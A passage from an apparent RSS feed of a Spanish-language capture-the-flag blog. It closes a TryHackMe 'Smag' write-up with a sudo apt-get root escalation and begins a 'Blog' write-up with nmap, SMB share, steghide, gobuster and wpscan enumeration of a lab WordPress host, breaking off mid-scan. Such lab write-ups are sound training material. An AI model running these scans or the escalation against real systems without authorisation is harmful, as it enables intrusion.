&lt;img src=&#34;https://sckull.github.io/images/posts/thm/smag/Screenshot_20200729_171928.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;apt-get&lt;/code&gt;. Utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/apt-get/&#34;&gt;&lt;code&gt;apt-get&lt;/code&gt;&lt;/a&gt; para obtener una shell root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/smag/Screenshot_20200729_172229.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/smag/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/smag/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Blog</title>
        <link>https://sckull.github.io/posts/blog/</link>
        <pubDate>Wed, 22 Jul 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 22 Jul 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/blog/</guid>
        <description>Blog es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Blog es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/blog/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Blog&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Billy Joel made a Wordpress blog!&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;350&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/Nameless0ne&#34;&gt;Nameless0ne&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Thu Jul 23 16:31:53 2020 as: nmap -sV -o nmap_scan_mini blog.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; blog.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.91.166&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.26s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;996&lt;/span&gt; closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp  open  http        Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: Host: BLOG&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Jul 23 16:32:56 2020 -- 1 IP address (1 host up) scanned in 63.00 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;samba&#34;&gt;SAMBA&lt;/h2&gt;
&lt;p&gt;Utilizamos smbclient para enumerar los SHARENAMES, encontramos &lt;code&gt;BillySMB&lt;/code&gt; en el cual logramos descargar algunos archivos multimedia.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/blog# smbclient -L blog.thm
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;s1&#34;&gt;&amp;#39;s password: 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	Sharename       Type      Comment
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	---------       ----      -------
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	print$          Disk      Printer Drivers
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	BillySMB        Disk      Billy&amp;#39;&lt;/span&gt;s &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; SMB Share
	IPC$            IPC       IPC Service &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;blog server &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Samba, Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
SMB1 disabled -- no workgroup available
root@upset:~/thm/blog# smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;blog.thm&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;BillySMB
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue May &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 13:17:05 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue May &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 12:58:23 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Alice-White-Rabbit.jpg              N    &lt;span class=&#34;m&#34;&gt;33378&lt;/span&gt;  Tue May &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 13:17:01 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  tswift.mp4                          N  &lt;span class=&#34;m&#34;&gt;1236733&lt;/span&gt;  Tue May &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 13:13:45 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  check-this.png                      N     &lt;span class=&#34;m&#34;&gt;3082&lt;/span&gt;  Tue May &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 13:13:43 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;

		&lt;span class=&#34;m&#34;&gt;15413192&lt;/span&gt; blocks of size 1024. &lt;span class=&#34;m&#34;&gt;9788768&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get Alice-White-Rabbit.jpg
getting file &lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;lice-White-Rabbit.jpg of size &lt;span class=&#34;m&#34;&gt;33378&lt;/span&gt; as Alice-White-Rabbit.jpg &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;18.8 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 18.8 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get check-this.png
getting file &lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;heck-this.png of size &lt;span class=&#34;m&#34;&gt;3082&lt;/span&gt; as check-this.png &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2.5 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 12.2 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get tswift.mp4
getting file &lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;swift.mp4 of size &lt;span class=&#34;m&#34;&gt;1236733&lt;/span&gt; as tswift.mp4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;110.8 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 89.9 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Archivos encontrados:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blog/Screenshot_20200723_154053.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos steghide en el archivo JPG para verificar si tenian archivos ocultos, pero solo fuimos trolleados.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/blog# steghide Alice-White-Rabbit.jpg 
steghide: unknown &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Alice-White-Rabbit.jpg&amp;#34;&lt;/span&gt;.
steghide: &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;steghide --help&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; help.
root@upset:~/thm/blog# steghide info Alice-White-Rabbit.jpg 
&lt;span class=&#34;s2&#34;&gt;&amp;#34;Alice-White-Rabbit.jpg&amp;#34;&lt;/span&gt;:
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;y/n&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; y
Enter passphrase: 
  embedded file &lt;span class=&#34;s2&#34;&gt;&amp;#34;rabbit_hole.txt&amp;#34;&lt;/span&gt;:
    size: 48.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
root@upset:~/thm/blog# steghide extract -sf Alice-White-Rabbit.jpg 
Enter passphrase: 
wrote extracted data to &lt;span class=&#34;s2&#34;&gt;&amp;#34;rabbit_hole.txt&amp;#34;&lt;/span&gt;.
root@upset:~/thm/blog# cat rabbit_hole.txt 
You&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;ve found yourself in a rabbit hole, friend.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El archivo QR al escanearlo nos devuelve una URL, esta url nos redirige a un video de youtube.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blog/Screenshot_20200723_154437.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blog/Screenshot_20200723_155541.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos, vemos que tiene directorios que pertenecen a Wordpress.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@upset:~/thm/blog# gobuster dir -u http://blog.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt
/rss (Status: 301)
/index.php (Status: 301)
/login (Status: 302)
/0 (Status: 301)
/feed (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 302)
/welcome (Status: 301)
/wp-login.php (Status: 200)
/n (Status: 301)
/w (Status: 301)
/rss2 (Status: 301)
/license.txt (Status: 200)
/wp-includes (Status: 301)
/readme.html (Status: 200)
/wp-register.php (Status: 301)
/no (Status: 301)
/wp-rss2.php (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/robots.txt (Status: 200)
/&#39; (Status: 301)
/dashboard (Status: 302)
/note (Status: 301)
/%20 (Status: 301)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;wpscan&#34;&gt;WPSCAN&lt;/h3&gt;
&lt;p&gt;Utilizamos &lt;code&gt;wpscan&lt;/code&gt; para enumerar version, usuarios, plugins y temas vulnerables de Wordpress. Encontramos dos usuarios registrados.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; URL: http://blog.thm/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started: Thu Jul &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; 16:52:47 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;

Interesting Finding&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; http://blog.thm/
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Interesting Entry: Server: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Found By: Headers &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Confidence: 100%

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; http://blog.thm/robots.txt
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Interesting Entries:
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  - /wp-admin/
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  - /wp-admin/admin-ajax.php
